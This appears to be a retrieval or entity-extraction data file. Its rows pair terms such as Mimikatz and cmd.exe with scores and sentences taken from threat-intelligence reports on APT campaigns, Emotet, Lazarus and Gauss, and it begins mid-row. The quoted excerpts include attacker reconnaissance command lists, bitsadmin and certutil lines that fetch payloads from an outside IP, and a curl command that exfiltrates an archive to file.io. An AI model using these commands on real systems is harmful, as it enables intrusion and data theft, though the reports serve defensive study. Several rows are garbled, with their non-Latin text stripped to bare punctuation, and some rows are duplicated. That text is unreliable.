process"|0.8187280981229277|"['Threat actors can add or remove features according to their malicious intentions.', ""Employing Cobalt Strike beacons in the attacks' infection chain allows the attackers to blend their malicious traffic with legitimate traffic and evade network detections."", 'Also, with its capabilities to configure commands in the beacon configuration, the attacker can perform various malicious operations such as injecting other malicious binary into the running processes of the infected machines and can avoid having a separate injection module implants in their infection chain.', 'The Cobalt Strike beacon configurations of this campaign showed us various characteristics of the beacon binary: C2 server.', 'Communication protocols.', 'Process injection techniques.', 'Malleable C2 Instructions.', 'Target process to spawn for x86 and x64 processes.', 'Watermark : ""Xi54kA=="".', '7/10Cobalt Strike beacon configuration sample.', 'The Cobalt Strike beacon used in this campaign has the following capabilities: Executes arbitrary codes in the target processes through process injection.']"
Mimikatz|0.7679312093796857|['The threat actors use built-in Windows administration tools and commercial off- the-shelf software to live off the land.', 'The threat actor at the keyboard uses RDP to access compromised systems rather than a backdoor or Remote Access Trojan (RAT).', 'Post-exploitation persistence is maintained by harvesting passwords from a wide variety of sources such as process memory, web browsers, network sniffing, and keyloggers.', 'There is no evidence of data theft, leaving the motivation behind Stolen Pencil largely uncertain.', 'Observed Sectors: Education and Think Tanks.', 'Tools used Mimikatz.', 'Information <https://www.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia> <https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national- security-think-tanks/> MITRE ATT&CK <https://attack.mitre.org/groups/G0086/> 219Threat Group Cards: A Threat Actor Encyclopedia Stone Panda, APT 10, menuPass Names Stone Panda (CrowdStrike) APT 10 (Mandiant) menuPass Team (Symantec) menuPass (Palo Alto) Red Apollo (PwC) CVNX (BAE Systems) Potassium (Microsoft) Hogfish (iDefense) Happyyongzi (FireEye) Country China Motivation Information theft and espionage Description menuPass is a threat group that appears to originate from China and has been active since approximately 2009.', 'The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014.', 'In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.', 'Observed Sectors: Aerospace, Defense, Government, Healthcare, MSPs and Pharmaceutical.', 'Countries: Australia, Brazil, Canada, Finland, France, India, Japan, Norway, Philippines, South Africa, South Korea, Sweden, Switzerland, Thailand, UK and USA.']
Mimikatz|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
Mimikatz|0.7679312093796857|['The threat actors use built-in Windows administration tools and commercial off- the-shelf software to live off the land.', 'The threat actor at the keyboard uses RDP to access compromised systems rather than a backdoor or Remote Access Trojan (RAT).', 'Post-exploitation persistence is maintained by harvesting passwords from a wide variety of sources such as process memory, web browsers, network sniffing, and keyloggers.', 'There is no evidence of data theft, leaving the motivation behind Stolen Pencil largely uncertain.', 'Observed Sectors: Education and Think Tanks.', 'Tools used Mimikatz.', 'Information <https://www.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia> <https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national- security-think-tanks/> MITRE ATT&CK <https://attack.mitre.org/groups/G0086/> 219Threat Group Cards: A Threat Actor Encyclopedia Stone Panda, APT 10, menuPass Names Stone Panda (CrowdStrike) APT 10 (Mandiant) menuPass Team (Symantec) menuPass (Palo Alto) Red Apollo (PwC) CVNX (BAE Systems) Potassium (Microsoft) Hogfish (iDefense) Happyyongzi (FireEye) Country China Motivation Information theft and espionage Description menuPass is a threat group that appears to originate from China and has been active since approximately 2009.', 'The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014.', 'In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.', 'Observed Sectors: Aerospace, Defense, Government, Healthcare, MSPs and Pharmaceutical.', 'Countries: Australia, Brazil, Canada, Finland, France, Germany, India, Japan, Netherlands, Norway, Philippines, South Africa, South Korea, Sweden, Switzerland, Thailand, UAE, UK and USA.']
Uses Mimikatz to harvest credentials.|0.7943590588810123|['Not only does it steal personal data and credentials including passwords, mail files, browser data, registry keys, and more, but it also downloads Ryuk, which encrypts their machine and ransoms their data for payment.This campaign targets companies in Europe and the USA, and signals a change in trend for Emotet and TrickBot, which are both well-known trojans.In this attack, Emotet is used as a dropper for the TrickBot trojan instead of performing its own malicious activities as a trojan.TrickBot has evolved to include advanced capabilities like password collecting, detection evasion, the launching of an Empire PowerShell backdoor, and the ability to download the Ryuk ransomware.', 'In addition, it has a module that allows an attacker to remotely view and control a victims desktop.This campaign used many advanced persistence, lateral movement, and detection evasion measures, including attempts to disable Windows Defender, the use of EternalBlue to spread, and the stopping of multiple services and processes related to anti malware products.The Triple Threat Campaign of emotet, trickbot, and ryukEmotet was first discovered in 2014 as a trojan used to steal banking credentials.', 'More recently, it has been used asa dropper of other trojans.', 'It has introduced several advanced capabilities over the years due to its modular structure, including an installation module, banking module, and DDoS module.', 'Emotet is mainly distributed through phishing emails using various social engineering techniques.TrickBot was first discovered in 2016 as a modular trojan inspired by Dyreza, another trojan and data stealer.', 'TrickBot uses mimikatz to harvest emails and other credentials.', 'Some variants have been known to steal from Bitcoin wallets as well.', 'Although trojans typically target individuals to steal bank account credentials, the TrickBot trojan in this research is being used to also deliver secondary malware.Ryuk ransomware was first detected in August of 2018 in targeted attacks through an unknown infection method.', 'It was able to gain access via Remote Desktop Services or other direct methods, and from there stole credentials and targeted high-profile data and servers to extort ransoms.', 'By January 2019, an active campaign of the Ryuk ransomware was discovered targeting victims who were previously attacked by TrickBot.', 'Previous research also showed campaigns of Emotet-TrickBot-Ryuk used to deploy and initiate the Ryuk ransomware.']
cmd.exe|0.8104175652537835|"['The malware then creates the directory %APPDATA%\\\\DameWareNT.', 'If the creation of this directory fails, the malware uses the directory %TEMP%\\\\DameWareNT instead.', 'In the newly-created DameWareNT folder, a file named data_0 is created.', 'The file contains a VictimID string, which consists of eight random characters.', 'If the file already exists, it is cleared, with the exception of the first line, retaining the previously created VictimID.', ""Next, the following commands are appended to the file, encrypted using XOR key 0xA5: cmd.exe /c ipconfig /all cmd.exe /c tasklist /svc cmd.exe /c netstat -ano cmd.exe /c systeminfo cmd.exe /c arp -a cmd.exe /c net use cmd.exe /c net user /domain cmd.exe /c net group /domain cmd.exe /c query user Finally, the malware starts two threads: The malware's first thread runs a check every three seconds to determine if the number of connected removable drives has changed."", 'If a change is detected, the following actions are performed: The drive is searched for the presence of either the file desktop.ini:_FLG:$DATA (the : character in the file name indicates that NTFS alternate data streams are used) or the file System Volume Information\\\\_WFConfig.log (in case of a FAT-formatted drive).', 'If found, the data in the file is appended to the contents of the data_0 file.', 'Files with the .res extension in the DameWareNT directory are scanned, and their contents are copied to the removable drive in a file named either desktop.ini:BYTES%VictimID%:$DATA (for NTFS) or System Volume Information_WTSettings_%VictimID%.log (for FAT).', 'The drive is searched for the file desktop.ini:IDX%VictimID%:$DATA (for NTFS) or System Volume Information_WRConfig_%VictimID%.log (for FAT).', 'If found, the data in the file is added to the contents of the data_0 file.']"
cmd.exe|1.0|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
cmd.exe|0.8886415531257763|"['These files provide sequential execution of commands using algorithmic structures such as conditional operators and loops.', 'Seeing as how cmd.exe is employed by attackers in a large number of cases and overlaps with other techniques of the MITRE ATT&CK matrix, here we will examine only a few examples of cmd.exe use at different stages of an attack without delving too deep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their corresponding techniques.', 'Examples of procedures Example 1 Lateral Tool Transfer via SMB.', 'Attackers use the copy command to copy the contents of the current folder to a remote host (the copied files contain the tools and malware that the attacker needs): $system32\\\\cmd.exe /C copy * \\\\\\\\<remote_ip>\\\\C$\\\\windows\\\\help\\\\help Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 90 Example 2 After gaining access to the system, the attackers conduct reconnaissance.', 'Similar to the procedures in the described incidents, the operator executes reconnaissance commands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\\\\\\\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Attackers use cmd.exe to run their malware: cmd /c $system32\\\\conhost64.exe Example 4 Attackers use cmd.exe to download the tools that they will use in subsequent stages of an attack to the compromised system: cmd.exe /c bitsadmin /transfer n hxxp://8.210.141[.', ']104:8099/1.txt $public\\\\Downloads\\\\1.txt cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.', ']104:8099/MEUpdate.exe $windir\\\\Help\\\\Help\\\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 91 Example 5 Operators exfiltrate the collected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\\\1.rar"" --ssl-no-revoke https://file.io Example 6 Attackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 92 The script gathers data on the system and saves this data to files, then adds them to an archive.', 'Here are all the reconnaissance commands employed in the script: ver >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb time /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb date /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb hostname >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb systeminfo >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net localgroup Administrators >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ipconfig /all >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist /v >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist -svc >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net start >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ping www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tracert -h 5 www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -aon >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -bv >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net use >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net share >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain controllers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain admins"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain computers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb nltest /domain_trusts >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb route print >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb arp -a >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\program files\\\\*.', '*"" >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\Program Files (x86)\\\\*.']"
cmd.exe|0.7970209500418814|"['It is worth noting that these samples were all compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Additionally, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed suggesting this is all part of the same campaign.', 'Despite this potential connection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware attempts to run a series of commands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These commands are as follows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query usercmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is seen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Host: www.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use eye-watch[.', ']in as a C&C channel but instead was downloaded from the URL: hxxps://www.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
cmd.exe|0.8352002528474389|"['Modular architecture of the victims infection process provides both additional flexibility and anonymity throughout the cyber-attack.', 'This scheme allows hackers to divide software development activity between teams, as well as to ensure the reuse of program code.', 'Recon Performs initial reconnaissance to determine if a systems is of interest to the threat actors Dropper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TrafficForwarder and injects into the legitimate process Client_TrafficForwarder Forwards operators commands from external network into corporate network Client_RAT Provides full control over the target system Recon is a backdoor that is initially installed on the target machine through successful execution of exploits.', 'This module is used by hackers to perform initial reconnaissance to search for systems of interest.', 'Once launched, the program adds itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\ Start Menu\\\\Programs\\\\Startup"", collects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data collected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\ CurrentVersion\\\\Internet Settings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tools, attribution1 Key 2 Attack 3 Attack 4 Recommendations 5 Indicators of 6 Appendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module will use the ""killkill"" command to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Dropper using the http command.', 'Dropper will then install Client_RAT to the infected system as follows: RECON DROPPER LOADER CLIENT_RAT 1 2 3 DROPPER Recon decrypts LOADER Dropper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Dropper extracts decrypted Client_RAT Client_RAT Dropper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Dropper needs MD5 encryption key, which only the attacker knows.', 'Group-IB specialists have analyzed two versions of Dropper.', 'There are no fundamental differences between them: both versions were used to decrypt the loader and encrypted payload, as well as to ensure loader persistence in the system.']"
cmd.exe|0.8005088309270048|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
cmd.exe|0.7784302417153919|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
cmd.exe|0.7610348906349725|"['Figure 5: A highly obfuscated XL4 macro.NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tool at its disposal, called Symbexcel, that applies symbolic execution techniques to the analysis of Excel macros.16 Using this tool, we can automatically de-obfuscate the XL4 macros and identify the additional components being downloaded (see Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threefold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The attackers may choose to use multiple hosts to increase the chances to download the payload and improve success rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by running rundll32.exe.', '3.', 'Gain registry persistence by running DllRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC command line is shown Figure 6).', 'The payload is a DLL file, which (unsurprisingly) is the main Emotet DLL.', 'In the case of the Excel document with hash 7c0d0a80e7ebb3af7ce549df78a5a68cbd5debb5, the DLL is 88cf39a587aeb8f075aa0ae23a42e16ce3656e71.']"
cmd.exe|1.0|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
cmd.exe|0.8089725984772371|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
cmd.exe|1.0|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
the tool downloads the files|0.7739334208088671|['Standalone EXE.', 'Presumed to be an earlier version before 2014 2015.04 CRYPTBASE.dll Assumed to have been created in December 2014.', 'Independent DLL.', 'Collect system information and file information within the USB flash drive.', '2015.06 BrWeb.dll, wsmt.exe Loads BrWeb.dll by patching a Brother Printer-related file.', 'Downloads files.', 'ALYAC25.exe patch function.', 'Scans *.hwp files.', 'Infects EXE files.', 'Additional malware is found.', '2015.06 CRYPTBASE.dll, svcmgr.exe Bnb Solution comparison functions were added.']
encrypted configuration|0.7603313856051124|['It writes itself in files: and modifies the %system32%\\\\wbem\\\\wmiqry32.dll, %system32%\\\\wbem\\\\wmihlp32.dll system registry to be loaded instead of file.', '%system32%\\\\wbem\\\\wbemsvc.dll To achieve this, it writes the following registry value: [HKCR\\\\CLSID\\\\{7C857801-7381-11CF-884D-00AA004B2E24}\\\\InProcServer32] Default = %system32%\\\\wbem\\\\wmihlp32.dll Operation The module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShellHWStop, Global\\\\ShellHWDetectionEvent events, mutex ShellHWDetectionMutex.', '12The main thread exits if the following processes were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwall.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lookout.exe savprogress.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHook.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Sniffer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe sppfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewallsvc.exe ssupdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgaccount.exe CavAUD.exe ipatrol.exe webwall.exe privatefirewall3.exe CavEmSrv.exe pcipprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rtt_crc_service.exe Cavvl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavApp.exe privatefirewall3.exe avas.exe sdtrayapp.exe CavCons.exe pfft.exe avcom.exe siteadv.exe CavMud.exe armorwall.exe avkproxy.exe sndsrvc.exe CavUMAS.exe app_firewall.exe avkservice.exe snsmcon.exe UUpd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4ss.exe avtask.exe avkwctl.exe CavQ.exe tppfdmn.exe aws.exe firewall.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rsser.exe bgnt.exe spybotsd.exe OnAccessInstaller.exe op_mon.exe bootsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bullguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewall.exe Packetyzer.exe wwasher.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13zerospywarelite_installer.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewall.exe ashdisp.exe rawshark.exe vdtask.exe firewall2004.exe ashmaisv.exe Ethereal.exe asr.exe firewallgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.', 'Gauss ShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%\\\\system32\\\\winshell.ocx %temp%\\\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\dskapi.ocx %temp%\\\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\smdk.ocx %temp%\\\\~mdk.tmp String values from config file (example) 14Every module is loaded and its export functions are called as specified in the configuration.', 'Most of the actions are logged in an encrypted (with XOR) file %temp%\\\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.', 'Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.']
encrypted configuration|0.7603313856051124|['It is possible that during initial infection, only the ShellHW component is installed, which then installs the other modules.ShellHW (file name wmiqry32.dll/wmihlp32.dll) is the main component of the malware which ensures that all other Gauss modules are loaded when the malware starts and operate correctly.Comparison with FlameAs we mentioned above, there are significant similarities in code and architecture between Gauss and Flame.', 'In fact, it is largely due to these similarities that Gauss was discovered.', 'We created the following table for a clearer understanding of these facts and proof of kinship between the two attack platforms:FeatureFlameGaussModular architectureYesYesUsing kernel driversNoNo.OCX files extensionsYesYesConfiguration settingsPredefined in main bodyStored in registryDLL injectionsYesYesVisual C++YesYesEncryption methodsXORXORUsing USB as storageYes (hub001.dat)Yes (.thumbs.db)Embedded LUA scriptingYesNoBrowser history/cookies stealerYes (soapr32/nteps32)Yes (winshell)CVE2010-2568 (.LNK exploit)Yes (target.lnk)Yes (target.lnk)C&C communicationhttpshttpsLog files/stolen data stored in %temp%YesYesZlib compression of collected dataYesYesIn addition to the features listed above, there are considerable similarities in the operation of the Flame and Gauss C&C servers.', 'The relevant analysis is provided in the C&C Communication section.There are more similarities in the code and data of the modules:Wmiqry32/Wmihlp32.dll aka ShellHWInstalled by: Unknown dropperOperates in two modes: installation and normal operation.File names%system32%wbemwmiqry32.dll%system32%wbemwmihlp32.dllSome known MD5C3B8AD4ECA93114947C777B19D3C605908D7DDB11E16B86544E0C3E677A60E10055AE6B8070DF0B3521D78E1B8D2FCE4FA54A8D31E1434539FBB9A412F4D32FF01567CA73862056304BB87CBF797B89923D956C297C67D94F591FCB574D9325FImage Size258 048 bytesNumber of resources7Resources121, 131, 141, 151, 161, 171, 181Date of compilationJun 1 2011Jul 16 2011Jul 18 2011Sep 28 2011Oct 20 2011Related files%temp%~shw.tmp%temp%~stm.tmpInstallationThe module checks if it was loaded by lsass.exe process and, if true, proceeds with the installation.It writes itself in files: %system32%wbemwmiqry32.dll, %system32%wbemwmihlp32.dll and modifies the system registry to be loaded instead of %system32%wbemwbemsvc.dll file.To achieve this, it writes the following registry value:[HKCRCLSID{7C857801-7381-11CF-884D-00AA004B2E24}InProcServer32] Default = %system32%wbemwmihlp32.dllOperationThe module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.The module creates ShellHWStop, GlobalShellHWDetectionEvent events, mutex ShellHWDetectionMutex.The main thread exits if the following processes were found at its start:LMon.exesagui.exeRDTask.exekpf4gui.exeALsvc.exepxagent.exefsma32.exelicwiz.exeSavService.exeprevxcsi.exealertwall.exelivehelp.exeSAVAdminService.execsi-eui.exempf.exelookout.exesavprogress.exelpfw.exempfcm.exeemlproui.exesavmain.exeoutpost.exefameh32.exeemlproxy.exesavcleanup.exefilemon.exeAntiHook.exeendtaskpro.exesavcli.exeprocmon.exexfilter.exenetguardlite.exebackgroundscanclient.exeSniffer.exescfservice.exeoasclnt.exesdcservice.exeacs.exescfmanager.exeomnitray.exesdcdevconx.exeaupdrun.exespywareterminatorshield.exeonlinent.exesdcdevconIA.exesppfw.exespywat~1.exeopf.exesdcdevcon.exespfirewallsvc.exessupdate.exepctavsvc.execonfiguresav.exefwsrv.exeterminet.exepctav.exealupdate.exeopfsvc.exetscutynt.exepcviper.exeInstLsp.exeuwcdsvr.exeumxtray.exepersfw.exeCMain.exedfw.exeupdclient.exepgaccount.exeCavAUD.exeipatrol.exewebwall.exeprivatefirewall3.exeCavEmSrv.exepcipprev.exewinroute.exeprotect.exeCavmr.exeprifw.exeapvxdwin.exertt_crc_service.exeCavvl.exetzpfw.exeas3pf.exeschedulerdaemon.exeCavApp.exeprivatefirewall3.exeavas.exesdtrayapp.exeCavCons.exepfft.exeavcom.exesiteadv.exeCavMud.exearmorwall.exeavkproxy.exesndsrvc.exeCavUMAS.exeapp_firewall.exeavkservice.exesnsmcon.exeUUpd.exeblackd.exeavktray.exesnsupd.execavasm.exeblackice.exeavkwctrl.exeprocguard.exeCavSub.exeumxagent.exeavmgma.exeDCSUserProt.exeCavUserUpd.exekpf4ss.exeavtask.exeavkwctl.exeCavQ.exetppfdmn.exeaws.exefirewall.exeCavoar.exeblinksvc.exebgctl.exeTHGuard.exeCEmRep.exesp_rsser.exebgnt.exespybotsd.exeOnAccessInstaller.exeop_mon.exebootsafe.exexauth_service.exeSoftAct.execmdagent.exebullguard.exexfilter.exeCavSn.exeVCATCH.